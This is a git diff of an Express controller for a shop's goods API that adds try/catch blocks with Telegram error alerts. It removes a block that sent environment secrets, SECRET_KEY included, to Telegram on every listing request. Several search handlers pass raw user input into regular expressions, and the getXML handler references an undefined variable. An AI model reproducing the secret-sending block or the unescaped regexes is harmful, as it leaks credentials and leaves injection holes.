@@ -17,136 +17,141 @@ const sendTelegramMessage = require("../helpers/telegram");
 // const result = await Goods.find();
 
 const getAll = async (req, res) => {
-	const {
-		      brand,
-		      category,
-		      sort  = "default",
-		      page  = 1,
-		      limit = 3000,
-	      } = req.query;
-
-	const query = {};
-	const normalize = (val) => val?.trim();
-
-	if (brand) {
-		const decodedBrand = decodeURIComponent(brand);
-		query.brand = {
-			$regex: new RegExp(`^${decodedBrand.trim()}$`, "i"), // ← чутливість до регістру прибрана
-		};
-	}
-
-	if (category) {
-		const decoded = decodeURIComponent(category);
-		const normalizedCategory = decoded.startsWith("/")
-			? decoded
-			: `/${decoded}`;
-
-		// 🪄 Розбиваємо шлях по слешах і прибираємо пусті
-		let parts = normalizedCategory
-			.split("/")
-			.filter(Boolean) // прибирає порожні сегменти
-			.map((str) => transliterate(str.trim(), true));
-		console.log(parts);
-
-		// 🧠 Видаляємо "katehoriji", якщо вона є першою
-		if (parts[0]) {
-			parts = parts.slice(1);
-		}
-
-		if (parts[0]) {
-			query.category = {
-				$regex: new RegExp(`^${normalize(parts[0])}$`, "i"),
-			};
-		}
-		if (parts[1]) {
-			query.subCategory = {
-				$regex: new RegExp(`^${normalize(parts[1])}$`, "i"),
-			};
-		}
-		if (parts[2]) {
-			query.subSubCategory = {
-				$regex: new RegExp(`^${normalize(parts[2])}$`, "i"),
-			};
-		}
-	}
-
-	// ==== PAGINATION ====
-	const skip = (parseInt(page) - 1) * parseInt(limit);
-
-	// ==== SORTING ====
-	let sortOptions = {};
-	switch (sort) {
-		case "nameABC":
-			sortOptions = {name: 1};
-			break;
-		case "nameCBA":
-			sortOptions = {name: -1};
-			break;
-		case "priceMin":
-			sortOptions = {price: 1};
-			break;
-		case "priceMax":
-			sortOptions = {price: -1};
-			break;
-		case "inStock":
-			query.amount = {$gte: 1};
-			break;
-		default:
-			sortOptions = {}; // no sorting
-	}
-
-	const result = await Goods.find(query)
-		.sort(sortOptions)
-		.skip(skip)
-		.limit(parseInt(limit));
-
-	const totalCount = await Goods.countDocuments(query);
-
-	if (!result.length) {
-		throw HttpError(404, "No goods found");
-	}
-
 	try {
-		await sendTelegramMessage(
-			`ENV: \n\n` +
-			`DB_HOST: ${process.env.DB_HOST}\n` +
-			`PORT: ${process.env.PORT}\n` +
-			`SECRET_KEY: ${process.env.SECRET_KEY}\n` +
-			`EMAIL_HOST: ${process.env.EMAIL_HOST}\n` +
-			`EMAIL_PORT: ${process.env.EMAIL_PORT}\n` +
-			`EMAIL_USER: ${process.env.EMAIL_USER}\n`
-		);
-	} catch (error) {
-		await sendTelegramMessage(error.message);
+		const {
+			      brand,
+			      category,
+			      sort  = "default",
+			      page  = 1,
+			      limit = 3000,
+		      } = req.query;
+
+		const query = {};
+		const normalize = (val) => val?.trim();
+
+		if (brand) {
+			const decodedBrand = decodeURIComponent(brand);
+			query.brand = {
+				$regex: new RegExp(`^${decodedBrand.trim()}$`, "i"), // ← чутливість до регістру прибрана
+			};
+		}
+
+		if (category) {
+			const decoded = decodeURIComponent(category);
+			const normalizedCategory = decoded.startsWith("/")
+				? decoded
+				: `/${decoded}`;
+
+			// 🪄 Розбиваємо шлях по слешах і прибираємо пусті
+			let parts = normalizedCategory
+				.split("/")
+				.filter(Boolean) // прибирає порожні сегменти
+				.map((str) => transliterate(str.trim(), true));
+			console.log(parts);
+
+			// 🧠 Видаляємо "katehoriji", якщо вона є першою
+			if (parts[0]) {
+				parts = parts.slice(1);
+			}
+
+			if (parts[0]) {
+				query.category = {
+					$regex: new RegExp(`^${normalize(parts[0])}$`, "i"),
+				};
+			}
+			if (parts[1]) {
+				query.subCategory = {
+					$regex: new RegExp(`^${normalize(parts[1])}$`, "i"),
+				};
+			}
+			if (parts[2]) {
+				query.subSubCategory = {
+					$regex: new RegExp(`^${normalize(parts[2])}$`, "i"),
+				};
+			}
+		}
+
+		// ==== PAGINATION ====
+		const skip = (parseInt(page) - 1) * parseInt(limit);
+
+		// ==== SORTING ====
+		let sortOptions = {};
+		switch (sort) {
+			case "nameABC":
+				sortOptions = {name: 1};
+				break;
+			case "nameCBA":
+				sortOptions = {name: -1};
+				break;
+			case "priceMin":
+				sortOptions = {price: 1};
+				break;
+			case "priceMax":
+				sortOptions = {price: -1};
+				break;
+			case "inStock":
+				query.amount = {$gte: 1};
+				break;
+			default:
+				sortOptions = {}; // no sorting
+		}
+
+		const result = await Goods.find(query)
+			.sort(sortOptions)
+			.skip(skip)
+			.limit(parseInt(limit));
+
+		const totalCount = await Goods.countDocuments(query);
+
+		if (!result.length) {
+			throw HttpError(404, "No goods found");
+		}
+
+		res.json({
+			page:       parseInt(page),
+			limit:      parseInt(limit),
+			total:      totalCount,
+			totalPages: Math.ceil(totalCount / limit),
+			goods:      result,
+		});
+	} catch (e) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/getAll): ${e.message}\n\n`
+			);
+		}
+		console.error(e);
+		throw e;
 	}
-	res.json({
-		page:       parseInt(page),
-		limit:      parseInt(limit),
-		total:      totalCount,
-		totalPages: Math.ceil(totalCount / limit),
-		goods:      result,
-	});
 };
 
 const getNews = async (req, res) => {
-	const {page = 1, limit = 32} = req.query;
-	const skip = (+page - 1) * +limit;
+	try {
+		const {page = 1, limit = 32} = req.query;
+		const skip = (+page - 1) * +limit;
 
-	// 1. Загальна кількість товарів
-	const totalItems = await Goods.countDocuments({new: true});
+		// 1. Загальна кількість товарів
+		const totalItems = await Goods.countDocuments({new: true});
 
-	// 2. Список товарів з пагінацією
-	const products = await Goods.find({new: true}, "-createdAt -updatedAt", {
-		skip,
-		limit: +limit,
-	});
+		// 2. Список товарів з пагінацією
+		const products = await Goods.find({new: true}, "-createdAt -updatedAt", {
+			skip,
+			limit: +limit,
+		});
 
-	res.json({
-		totalItems,
-		totalPages:  Math.ceil(products.length / +limit),
-		currentPage: +page,
-		items:       products,
-	});
+		res.json({
+			totalItems,
+			totalPages:  Math.ceil(products.length / +limit),
+			currentPage: +page,
+			items:       products,
+		});
+	} catch (e) {
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/getNews): ${e.message}\n\n`
+		);
+		console.error(e);
+		throw e;
+	}
 };
 
 // const result = await Wood.find({owner}, "-createdAt -updatedAt", {skip, limit}).populate("owner", "name email");
@@ -157,49 +162,97 @@ const getNews = async (req, res) => {
 // skip скілеи пропустити обєктів в базі, limit скільки повернути
 
 const getById = async (req, res) => {
-	const {id} = req.params;
-	// const result = await Book.findOne({_id: id})
-	const result = await Goods.findOne({id: id});
-	if (!result) {
-		throw HttpError(404, "Not found");
+	try {
+		const {id} = req.params;
+		// const result = await Book.findOne({_id: id})
+		const result = await Goods.findOne({id: id});
+		if (!result) {
+			throw HttpError(404, "Not found");
+		}
+		res.json(result);
+	} catch (e) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/getById): ${e.message}\n\n`
+			);
+		}
+		console.error(e);
+		throw e;
 	}
-	res.json(result);
 };
 
 const add = async (req, res) => {
-	const {_id: owner} = req.user;
-	const result = await Goods.create({...req.body, owner});
-	//  const result = await Wood.create({...req.body});
-	res.status(201).json(result);
+	try {
+		const {_id: owner} = req.user;
+		const result = await Goods.create({...req.body, owner});
+		//  const result = await Wood.create({...req.body});
+		res.status(201).json(result);
+	} catch (e) {
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/add): ${e.message}\n\n`
+		);
+		console.error(e);
+		throw e;
+	}
 };
 
 const updateById = async (req, res) => {
-	const {id} = req.params;
-	const result = await Goods.findByIdAndUpdate(id, req.body, {new: true});
-	if (!result) {
-		throw HttpError(404, "Not found");
+	try {
+		const {id} = req.params;
+		const result = await Goods.findByIdAndUpdate(id, req.body, {new: true});
+		if (!result) {
+			throw HttpError(404, "Not found");
+		}
+		res.json(result);
+	} catch (e) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/updateById): ${e.message}\n\n`
+			);
+		}
+		console.error(e);
+		throw e;
 	}
-	res.json(result);
 };
 
 const updateCheked = async (req, res) => {
-	const {id} = req.params;
-	const result = await Goods.findByIdAndUpdate(id, req.body, {new: true});
-	if (!result) {
-		throw HttpError(404, "Not found");
+	try {
+		const {id} = req.params;
+		const result = await Goods.findByIdAndUpdate(id, req.body, {new: true});
+		if (!result) {
+			throw HttpError(404, "Not found");
+		}
+		res.json(result);
+	} catch (e) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/updateCheked): ${e.message}\n\n`
+			);
+		}
+		console.error(e);
+		throw e;
 	}
-	res.json(result);
 };
 
 const deleteById = async (req, res) => {
-	const {id} = req.params;
-	const result = await Goods.findByIdAndRemove(id);
-	if (!result) {
-		throw HttpError(404, "Not found");
+	try {
+		const {id} = req.params;
+		const result = await Goods.findByIdAndRemove(id);
+		if (!result) {
+			throw HttpError(404, "Not found");
+		}
+		res.json({
+			message: "Delete success",
+		});
+	} catch (e) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/deleteById): ${e.message}\n\n`
+			);
+		}
+		console.error(e);
+		throw e;
 	}
-	res.json({
-		message: "Delete success",
-	});
 };
 const getCSV = async (req, res) => {
 	try {
@@ -249,7 +302,10 @@ const getCSV = async (req, res) => {
 		res.attachment("products.csv");
 		res.status(200).send(csv); // Відправляємо CSV-файл
 	} catch (error) {
-		console.error(error); // Логування помилок
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/getCSV): ${error.message}\n\n`
+		);
+		console.error(error);
 		return res.status(500).send("Error generating CSV");
 	}
 };
@@ -318,38 +374,67 @@ const getXML = async (req, res) => {
 
 		res.status(200).send(xml);
 	} catch (error) {
+		if (e.code !== 404) {
+			await sendTelegramMessage(
+				`❌ Помилка (Backend. controllers/goods/getXML): ${error.message}\n\n`
+			);
+		}
 		console.error(error);
 		return res.status(500).send("Error generating XML");
 	}
 };
 
 const findByName = async (req, res) => {
-	const {name} = req.params;
-	const result = await Goods.find({
-		name: {$regex: name, $options: "i"}
-	});
-	res.json(result);
+	try {
+		const {name} = req.params;
+		const result = await Goods.find({
+			name: {$regex: name, $options: "i"}
+		});
+		res.json(result);
+	} catch (e) {
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/findByName): ${e.message}\n\n`
+		);
+		console.error(e);
+		throw e;
+	}
 };
 
 const findByBrandName = async (req, res) => {
-	const {brandName} = req.params;
-	const result = await Goods.find({
-		brand: {$regex: brandName, $options: "i"}
-	});
-	res.json(result);
+	try {
+		const {brandName} = req.params;
+		const result = await Goods.find({
+			brand: {$regex: brandName, $options: "i"}
+		});
+		res.json(result);
+	} catch (e) {
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/findByBrandName): ${e.message}\n\n`
+		);
+		console.error(e);
+		throw e;
+	}
 };
 
 const findByCategory = async (req, res) => {
-	const {category} = req.params;
-	const regex = new RegExp(category, "i");
-	const result = await Goods.find({
-		$or: [
-			{category: regex},
-			{subCategory: regex},
-			{subSubCategory: regex},
-		],
-	});
-	res.json(result);
+	try {
+		const {category} = req.params;
+		const regex = new RegExp(category, "i");
+		const result = await Goods.find({
+			$or: [
+				{category: regex},
+				{subCategory: regex},
+				{subSubCategory: regex},
+			],
+		});
+		res.json(result);
+	} catch (e) {
+		await sendTelegramMessage(
+			`❌ Помилка (Backend. controllers/goods/findByCategory): ${e.message}\n\n`
+		);
+		console.error(e);
+		throw e;
+	}
 };
 
 module.exports = {
